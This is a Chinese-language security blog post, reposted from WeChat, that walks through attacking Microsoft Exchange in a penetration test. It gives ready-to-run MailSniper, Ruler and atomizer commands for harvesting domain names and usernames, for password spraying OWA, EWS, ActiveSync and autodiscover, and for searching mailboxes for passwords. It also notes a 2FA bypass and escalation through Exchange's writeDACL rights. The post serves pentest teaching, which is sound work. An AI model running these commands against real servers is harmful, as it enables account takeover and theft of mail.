<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xv2Ft7tfOyWJSUI8TTCt1g)

点击上方 [蓝字]，关注我们

**建议大家把公众号 “Z2O 安全攻防” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

免责声明
====

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。

文章正文
====

0x00 Exchange 简介
----------------

Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。简单而言，Exchange server 可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。

0x01 Exchange Endpoint
----------------------

通常 Exchange Server 有以下 endpoint，即可访问的连接如下：

```
 https://Exchangeserver/AutoDiscover/
 https://Exchangeserver/Ecp/
 https://Exchangeserver/EWS/
 https://Exchangeserver/mapi/
 https://Exchangeserver/Microsoft-Server-ActiveSync/
 https://Exchangeserver/OAB/
 https://Exchangeserver/OWA/
 https://Exchangeserver/PowerShell/
 https://Exchangeserver/Rpc/

```

每个 endpoint 的作用如下：

<table width="963"><thead><tr cid="n14" mdtype="table_row"><th>endpoint</th><th>说明</th></tr></thead><tbody><tr cid="n17" mdtype="table_row"><td>/autodiscover</td><td>自 Exchange Server 2007 开始推出的一项自动服务，用于自动配置用户在 Outlook 中邮箱的相关设置，简化用户登陆使用邮箱的流程。</td></tr><tr cid="n20" mdtype="table_row"><td>/ecp “Exchange Control Panel”</td><td>Exchange 管理中心，管理员用于管理组织中的 Exchange 的 Web 控制台</td></tr><tr cid="n23" mdtype="table_row"><td>/ews “Exchange Web Services”</td><td>Exchange Web Service, 实现客户端与服务端之间基于 HTTP 的 SOAP 交互</td></tr><tr cid="n26" mdtype="table_row"><td>/mapi</td><td>Outlook 连接 Exchange 的默认方式，在 2013 和 2013 之后开始使用，2010 sp2 同样支持</td></tr><tr cid="n29" mdtype="table_row"><td>/Microsoft-Server-ActiveSync</td><td>用于移动应用程序访问电子邮件</td></tr><tr cid="n32" mdtype="table_row"><td>/OAB “Offline Address Book”</td><td>用于为 Outlook 客户端提供地址簿的副本，减轻 Exchange 的负担</td></tr><tr cid="n35" mdtype="table_row"><td>/owa “Outlook Web APP”</td><td>Exchange owa 接口，用于通过 web 应用程序访问邮件、日历、任务和联系人等</td></tr><tr cid="n38" mdtype="table_row"><td>/powershell</td><td>用于服务器管理的 Exchange 管理控制台</td></tr><tr cid="n41" mdtype="table_row"><td>/RPC</td><td>早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互</td></tr></tbody></table>

以上 endpoint 中，常用于暴力破解的有 / owa 、/ews、/Microsoft-Server-ActiveSync 及 / autodiscover，如 owa 的暴力破解（passwordspray）：抓取登录包如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyiaicQ6QgxPtk43W1DH25zOaRusZzrRiaIIQ6d5EQM3EFPZ32GSdeicstpg/640?wx_fmt=png&from=appmsg)

> 用户名可尝试使用 domain\username、domian.com\username、username

使用某密码进行暴力破解：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyvo4u6MxVic8DRjiaAbSb1iaPYs8hpy85icicficn4jbkChIxJgbTWkz88yQA/640?wx_fmt=png&from=appmsg)

`/Microsoft-Server-ActiveSync` 爆破为 401 认证，需要对用户账号密码进行 base64 处理:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyqPgAQeTaytU9vMAMOoT9xHpCxDqYqUD3mpj7G2iaFfribbby4zg5bI5w/640?wx_fmt=png&from=appmsg)

> ```
>  YWRtaW46YWRtaW4=` -> `admin:admin
> 
> ```

`/ews`、`/rpc` 等几个 endpoint 同样为 401 认证，账号密码的加密方式为 NTLM Authenticate：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyy3LGRryf76JIa2mNnoj7VtRcOkMVjjO28KSGVuEUYZgahG2Gkd0TAOg/640?wx_fmt=png&from=appmsg)

爆破需对账号密码进行处理之后在进行。

0x02 Get UserList
-----------------

### 验证 Exchange

对 Exchange 的利用首先要确定其是否使用了 exchange，关于判断的方式，我知道的方式有:

1、checkO365

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyytJe8J2ZTqKvP35icvUibV9duibBQibia29zgSibyCxbTNpiaWY3MdnsVey0Rg/640?wx_fmt=png&from=appmsg)

2、owa 登录页面，如：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyicX15CeoNapUTUUABibIBCw6QibNdI2v0qQokT6XXIsLSDxe0Hf3cUgjw/640?wx_fmt=png&from=appmsg)

3、特殊域名：访问如下域名

```
 https://autodiscover.domain.com/autodiscover/autodiscover.xml
 https://owa.domian/owa/
 https://mail.domain.com/
 https://webmail.domain.com/

```

### 获取用户列表

之后我们需要获取其至少一个账号的信息，那么就需要取搜集获取某域的用户列表，除了 top username 进行爆破，还可以使用 theharvester、Mailget 等工具进行搜集，另外还有一种通过延时来判断的方式。在 MailSniper 写了这样几种来判断内部域和存在用户的方法：

*   Invoke-DomainHarvest
    
*   Invoke-UsernameHarvestOWA
    
*   Invoke-UsernameHarvestEAS
    

首先来看 Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：

```
 Invoke-DomainHarvestOWA -ExchHostname domian.com

```

脚本会构造如下 url:

```
 $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
 $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
 $autodiscoverurl = ("https://" + $ExchHostname + "/autodiscover/autodiscover.xml")
 $ewsurl = ("https://" + $ExchHostname + "/EWS/Exchange.asmx")

```

在未指定`brute`的情况下，脚本会先请求`autodiscoverurl`, 若失败，再请求 ewsurl，并通过请求头里面的 NTLM Authenticate 数据来猜测内部域名，如：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyytbNI37uibFuS9NxWwn4qboe0GEiaib034n4Vt1SrWmovyRXtQpW0n3CdA/640?wx_fmt=png&from=appmsg)

> 需要注意到是，未指定 brute 的时候需要更改 - ExchHostname 为对应的 autodiscoverurl 及 ewsurl

指定 brute 的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求 owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求 owa，根据其响应时间的不同来判断域及用户名，在这里有两种 brute 方式，第一种通过导入域名列表：

```
 Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute

```

第二种通过公司名称来猜测：

```
 Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName "bla bla" -OutFile potentially-valid-domains.txt -brute

```

获取域名之后，可导入用户名进行用户名存在检测：

```
 Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
 Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads 1 -OutFile eas-valid-users.txt

```

> PS : 作者说这个问题提交给微软以后并没有修复，但是实际测试效果并不好，但是没准碰到可以使用的情况也说不定。

当获取到一个用户的账号密码之后，可以通过`Get-GlobalAddressList`来获取 GlobalAddress 的用户邮箱地址：

```
 Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyQVCrqbtImIHOuqptu5azmUw66lYRDcBanQNxJlbY2b1goibbHJyibhIg/640?wx_fmt=png&from=appmsg)

0x03 Brute Force
----------------

在这里暴力破解的地方有很多个，首先可以通过 burpsuite 对 OWA 进行暴力破解，另外就是`/autodiscover`、`/ews`、`/Microsoft-Server-ActiveSync` 等几个 endpoint，可利用的工具如：MailSniper、Ruler、SprayingToolkit，可根据个人喜好取舍。为了防止账号因多次登陆失败触发告警或账户被封禁，建议使用同密码爆破用户名的方式进行暴力破解。下面介绍一下 MailSniper 的相关方法的使用。

**通过 owa 爆破：**

```
 Import-Module .\MailSniper.ps1
 Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyHUnh8h4jCrI4CQicOSkXich9TBkM4wmPhcI3ooh3DlWM6bJY2ZtLcfzg/640?wx_fmt=png&from=appmsg)

**通过 ews 爆破：**

```
 Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyy5etBO2VVtxI1SRmlRcS8J3Ol7KlxAD7enpcgBjo9Gia7ufTTMxPg1Ww/640?wx_fmt=png&from=appmsg)

**通过 Microsoft-Server-ActiveSync 爆破：**

```
 Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyj65B2dXG5FicnIQ32StaAbszpuCRmPxb3AP3KoLH3mbBmRkVzqtjuGQ/640?wx_fmt=png&from=appmsg)

**通过 autodiscover 爆破：**在 MailSniper 中没有写对 autodiscover 的爆破，可以选择使用 burp、ruler 或者 SprayingToolkit。

```
 python atomizer.py owa autodiscoverhost password user.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyy5FHaica2dPLz6ugVuYkM1CX2iaxqUvVqaGK3WX6Y4ibVIMkmTzwIbDNuA/640?wx_fmt=png&from=appmsg)

```
 ./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyqxecqwrvVGPHspBWf3F9VcoVtgJLut5U11oqGicKmiaREBaiaAchhbWAQ/640?wx_fmt=png&from=appmsg)

0x04 Search mail
----------------

在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用 Exchange 的接口进行邮件的检索，其接口的相关开发可以参考《Exchange Web Service(EWS) 开发指南》，在外网情况下，可使用此工具来列出邮件内容。

```
 ./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyP8IIPPeGy561yXj755HvEJicvONPs454fEDjSOibboVjr8eDgogzUnLw/640?wx_fmt=png&from=appmsg)

搜索某字符串：

```
 ./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyjVy94xnhQGAvHZsUgXRLqhfZpUJibxgCngQ9Yqrrzj0uKzU1b7ecADA/640?wx_fmt=png&from=appmsg)

或者使用 MailSniper 的 Invoke-SelfSearch 添加`-remote` 参数，输入账号密码即可。使用接口可以`bypass一些owa的2FA`。

内网情况下可使用 MailSniper 来快速检索，如使用 xiaoming\domain 用户登录某主机，可在该主机上搜索 xiaoming 的邮箱（不需要密码）

```
 Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv 1.csv

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyVBs5Cv6shqEzZpviazZyVqxQlZn1ian0WicCicX7SPiawY0PfXnlHlhNBow/640?wx_fmt=png&from=appmsg)

如果获得了域管理员的密码，可以检索任意邮件的内容：

```
 Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator -AdminPassword password -Term "*pass*" -Folder all

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyCDiaaMicoH81LLvpia3WYzBuhN6mfV4iaKyXU13hKHGVsI9iaNkMFRgltNw/640?wx_fmt=png&from=appmsg)

> 检索可使用`-Term`或者正则`-Regex`来指定关键字，`-ImpersonationAccount`用于将当前用户身份合法伪装其他邮箱用户，进而获得查询所有邮箱用户邮件的权限，如果查询失败，可以尝试添加`-ExchangeVersion`更换 Exchange 版本, 目前支持版本为`Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1`

0x05 后渗透
--------

在获取一个用户的账号密码之后，如何进入内网？这里有一个神器 **Ruler**, 在 Outlook 中有一个 Rules and Alerts 的功能，利用此功能，可执行一些特定的如执行命令等操作，关于 ruler 的具体使用，可以参考相关文章，另外在内网中，如何去发现 Exchange 服务器，如何使用 NTLM 中继来接管某用户邮箱的权限，这些内容在《深入 Exchange Server 在网络渗透下的利用方法》中有了很详细的讲解，在这里就不多做阐述。

另外需要补充一点可能有用的东西，Exchange 安装以后会创建一个`Organization Management` 安全组：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyyvicYO5yjFxw2gOocMHfoyOcwLLFk6XCbS44I51iap5SluzpPXaCOy19Q/640?wx_fmt=png&from=appmsg)

该组内的成员除了访问 Exchagne 设置外，可以修改其他 Exchagne 安全组的成员身份，如`Exchange Trusted Subsystem`, 此组为`Exchange Windows Permissions`的成员

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrEIEstj5IYhErMEkR8gyy5kFk1j7lpm4zHk9nMoUohgSibAU0ONpqCIoV8HZaLc5NPKIupMjJohQ/640?wx_fmt=png&from=appmsg)

默认情况下，`Exchange Windows Permissions`安全组对安装 Exchange 的域的域对象具有 writeDACL 权限, 这就意味着，我们可以进行权限的提升，详细的文章可以参考《Escalating privileges with ACLs in Active Directory》。

0x06 总结
-------

本文记录了我自己对 Exchange 在渗透中的利用的一些方式的总结，欢迎补充，更详细的内容可以查看参考的文章。

0x07 参考
-------

1.  https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&isappinstalled=0
    
2.  https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/
    
3.  https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/
    
4.  https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
    

                             文章来源：https://evi1cg.me/archives/Exchange_Hack.html

技术交流
====

### 学习圈子

一个引导大家一起成长，系统化学习的圈子。

如果看到这里的师傅是基础不够扎实 / 技术不够全面 / 入行安全不久 / 有充足时间的初学者... 其中之一，那么欢迎加入我们的圈子，圈子提供以下内容：

**1、每周发布学习任务，由浅入深，循序渐进，从常见的 Web 漏洞原理与利用、业务逻辑漏洞与挖掘，到 WAF 绕过、代码审计、钓鱼与免杀，再到 Linux/Windows 内网、提权、权限维持、隧道代理、域渗透，层层递进。会发布相应的参考资料及建议，成员自行学习实践，并会根据每周任务选取 1-3 位完成优秀的成员，返还入圈费用。**

2、日常分享优质学习资源与攻防渗透技巧，包括但不限于渗透 tips、教程、手册、学习路线等。

3、一个学习氛围浓厚的社区，遇到问题可以快速提问、交流讨论，共同学习。

*   目前已经规划了几个月的内容：  
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYHyEqA6pDb8VLMp8HsIicKjI8JbTjQ6Qv5fib5NL1mUqWgkHF130FUezb0uwppCQTOnuHrw5fpLHog/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

**欢迎加入我们，一起学习：**

                     ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKua4PgCbFWvSAw9iaITiaRhcyJB8MXPtSRMLKgLGiaic2SxVsTr3hfSialoeibzMBlyUicjYrGbYSx43wLoPg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1) 

### 交流群

关注公众号回复 “**加群**”，添加 Z2OBot 好友，自动拉你加入 **Z2O 安全攻防交流群 (微信群)** 分享更多好东西。**（QQ 群可直接扫码添加）**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

### 关注我们

**关注福利：**

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

点个【 在看 】，你最好看